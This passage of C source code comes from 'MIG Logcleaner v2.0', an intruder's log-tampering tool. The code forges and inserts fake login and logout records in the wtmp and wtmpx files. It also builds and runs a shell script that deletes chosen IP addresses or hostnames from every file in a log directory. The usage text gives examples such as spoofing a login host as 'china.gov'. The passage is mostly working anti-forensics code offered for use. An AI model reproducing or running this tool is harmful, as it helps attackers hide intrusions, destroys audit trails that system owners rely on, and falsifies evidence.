  new_wtmp_out_record.ut_time = O;
  strcpy(new_wtmp_out_record.ut_name, "");
  strcpy(new_wtmp_out_record.ut_line, T);
  strcpy(new_wtmp_out_record.ut_host, H);
#endif
#ifdef SUN
  new_wtmpx_in_record.ut_type = 7;
  new_wtmpx_in_record.ut_pid = 0;
  new_wtmpx_in_record.ut_exit.e_termination = 0;
  new_wtmpx_in_record.ut_exit.e_exit = 0;
  new_wtmpx_in_record.ut_session = 0;
  new_wtmpx_in_record.ut_tv.tv_sec = I;
  new_wtmpx_in_record.ut_tv.tv_usec = 0;
  strcpy(new_wtmpx_in_record.ut_user, U);
  strcpy(new_wtmpx_in_record.ut_line, T);
  strcpy(new_wtmpx_in_record.ut_host, H);
  new_wtmpx_out_record.ut_type = 8;
  new_wtmpx_out_record.ut_pid = 0;
  new_wtmpx_out_record.ut_exit.e_termination = 0;
  new_wtmpx_out_record.ut_exit.e_exit = 0;
  new_wtmpx_out_record.ut_session = 0;
  new_wtmpx_out_record.ut_tv.tv_sec = O;
  new_wtmpx_out_record.ut_tv.tv_usec = 0;
  strcpy(new_wtmpx_out_record.ut_user, "");
  strcpy(new_wtmpx_out_record.ut_line, T);
  strcpy(new_wtmpx_out_record.ut_host, H);
#endif
  if((fd1 = open(WTMP, O_RDWR)) != (-1))
  {
    if((fd2 = open("/tmp/WTMP.TMP", O_RDWR | O_CREAT)) == (-1))
    {
      if(d == 1)
	fprintf(stderr, "Error opening /tmp/WTMP.TMP file\n");
    }
    while(read(fd1, (char *) &wtmp_record, sizeof(wtmp_record)) == sizeof(wtmp_record))
    {
      if((!strcmp(wtmp_record.ut_name, u))
#ifndef BSD
	 && (wtmp_record.ut_type != 8)
#endif
	)
      {
	counter++;
	if(counter == (tota1 + 1 - n))
	{
	  write(fd2, (char *) &wtmp_record, sizeof(wtmp_record));
	  write(fd2, (char *) &new_wtmp_in_record, sizeof(new_wtmp_in_record));
	  write(fd2, (char *) &new_wtmp_out_record, sizeof(new_wtmp_out_record));
	  fprintf(stdout, "[0x%d] Added  user \"%s\" before %d entry of user \"%s\" in %s file\n", c++, U, n, u, WTMP);
	}
	else
	{
	  write(fd2, (char *) &wtmp_record, sizeof(wtmp_record));
	}
      }
      else
      {
	write(fd2, (char *) &wtmp_record, sizeof(wtmp_record));
      }
    }
    if(u[0] == 0 && check == 0)
    {
      write(fd2, (char *) &new_wtmp_in_record, sizeof(new_wtmp_in_record));
      write(fd2, (char *) &new_wtmp_out_record, sizeof(new_wtmp_out_record));
      fprintf(stdout, "[0x%d] Added  user \"%s\" entry on top of  %s file\n", c++, U, WTMP);
      check++;
    }
    close(fd1);
    close(fd2);
    sprintf(command, "mv /tmp/WTMP.TMP %s;chmod 644 %s", WTMP, WTMP);
    system(command);
  }
  else
  {
    if(d == 1)
      fprintf(stderr, "Error opening %s file\n", WTMP);
  }
  counter = 0;
  check = 0;
#ifdef SUN
  if((fd1 = open(WTMPX, O_RDWR)) != (-1))
  {
    if((fd2 = open("/tmp/WTMPX.TMP", O_RDWR | O_CREAT)) == (-1))
    {
      if(d == 1)
	fprintf(stderr, "Error opening /tmp/WTMPX.TMP file\n");
    }
    while(read(fd1, (char *) &wtmpx_record, sizeof(wtmpx_record)) == sizeof(wtmpx_record))
    {
      if((!strcmp(wtmpx_record.ut_name, u)) && (wtmpx_record.ut_type != 8))
      {
	counter++;
	if(counter == (tota2 + 1 - n))
	{
	  write(fd2, (char *) &wtmpx_record, sizeof(wtmpx_record));
	  write(fd2, (char *) &new_wtmpx_in_record, sizeof(new_wtmpx_in_record));
	  write(fd2, (char *) &new_wtmpx_out_record, sizeof(new_wtmpx_out_record));
	  fprintf(stdout, "[0x%d] Added  user \"%s\" before %d entry of user \"%s\" in %s file\n", c++, U, n, u, WTMPX);
	}
	else
	{
	  write(fd2, (char *) &wtmpx_record, sizeof(wtmpx_record));
	}
      }
      else
      {
	write(fd2, (char *) &wtmpx_record, sizeof(wtmpx_record));
      }
    }
    if(u[0] == 0 && check == 0)
    {
      write(fd2, (char *) &new_wtmpx_in_record, sizeof(new_wtmpx_in_record));
      write(fd2, (char *) &new_wtmpx_out_record, sizeof(new_wtmpx_out_record));
      fprintf(stdout, "[0x%d] Added  user \"%s\" entry on top of  %s file\n", c++, U, WTMPX);
      check++;
    }
    close(fd1);
    close(fd2);
    sprintf(command, "mv /tmp/WTMPX.TMP %s;chmod 644 %s", WTMPX, WTMPX);
    system(command);
  }
  else
  {
    if(d == 1)
      fprintf(stderr, "Error opening %s file\n", WTMPX);
  }
#endif
  return (0);
}
int txt_clean(char *D, char *a, char *b, int d)
{
  char command[999];
  bzero(command,sizeof(command));
  sprintf(command,"echo \"find %s -type f|grep -v \
wtmp|grep -v utmp|grep -v lastlog>/tmp/dirs.\
IP\">/tmp/mig.sh;echo \"if [ -s /tmp/dirs.IP ]\">\
>/tmp/mig.sh;echo then>>/tmp/mig.sh;echo \"set \\`cat \
/tmp/dirs.IP\\`\">>/tmp/mig.sh;echo \"for F1 in \\
\`echo \\$@\\`\">>/tmp/mig.sh;echo do>>/tmp/mig.sh;ech\
o \"cat \\\"\\$F1\\\"|grep -v \\\"%s\\\">/tm\
p/F1.tmp;cat /tmp/F1.tmp>\\\"\\$F1\\\"\">>/tmp/mi\
g.sh;echo done>>/tmp/mig.sh;echo fi>>/tmp/mig.sh;echo \
\"if [ -s /tmp/dirs.IP ]\">>/tmp/mig.sh;echo then\
>>/tmp/mig.sh;echo \"set \\`cat /tmp/dirs.IP\\`\"\
>>/tmp/mig.sh;echo \"for F2 in \\`echo \\$@\\`\">\
>/tmp/mig.sh;echo do>>/tmp/mig.sh;echo \"cat \\\"\\$F2\
\\\"|grep -v \\\"%s\\\">/tmp/F2.tmp;cat /tmp\
/F2.tmp>\\\"\\$F2\\\"\">>/tmp/mig.sh;echo done>>/tmp/m\
ig.sh;echo fi>>/tmp/mig.sh",D,a,b);
  system(command);
  system("chmod +x /tmp/mig.sh");
  system("/tmp/mig.sh");
  printf("[0x%d] Removed \"%s\" and \"%s\" strings out of %s direcotry\n",c++,a,b,D);
  remove("/tmp/mig.sh");
  remove("/tmp/F1.tmp");
  remove("/tmp/F2.tmp");
  remove("/tmp/dirs.IP");
  return (0);
}
int usage(char *arg)
{
  printf("\n[0;32m******************************[0m\n");
  printf("[0;32m* MIG Logcleaner v2.0 by [0;31mno1 [0;32m*[0m\n");
  printf("[0;32m******************************[0m\n");
  printf("usage: %s [-u] [-n] [-d] [-a] [-b] [-R] [-A] [-U] [-T] [-H] [-I] [-O] [-d]\n\n", arg);
  printf(" [-u <user>]\t- username\n");
  printf(" [-n <n>]\t- username record number, 0 removes all records (default: 1)\n");
  printf(" [-d <dir>]\t- log directory (default: /var/log/)\n");
  printf(" [-a <string1>]\t- string to remove out of every file in a log dir (ip?)\n");
  printf(" [-b <string2>]\t- string to remove out of every file in a log dir (hostname?)\n");
  printf(" [-R]\t\t- replace details of specified user entry\n");
  printf(" [-A]\t\t- add new entry before specified user entry (default: 1st entry in list)\n");
  printf(" [-U <user>]\t- new username used in -R of -A\n");
  printf(" [-T <tty>]\t- new tty used in -A\n");
  printf(" [-H <host>]\t- new hostname used in -R or -A\n");
  printf(" [-I <n>]\t- new log in time used in -R or -A (unit time format)\n");
  printf(" [-O <n>]\t- new log out time used in -R or -A (unit time format)\n");
  printf(" [-d]\t\t- debug mode\n\n");
  printf("eg:    %s -u john -n 2 -d /secret/logs/ -a 1.2.3.4 -b leet.org\n", arg);
  printf("       %s -u john -n 6\n", arg);
  printf("       %s -d /secret/logs/ -a 1.2.3.4\n", arg);
  printf("       %s -u john -n 2 -R -H china.gov\n", arg);
  printf("       %s -u john -n 5 -A -U jane -T tty1 -H arb.com -I 12345334 -O 12345397\n\n", arg);
  return (0);
}
/*******************/
// greyhats.za.net //
/*******************/
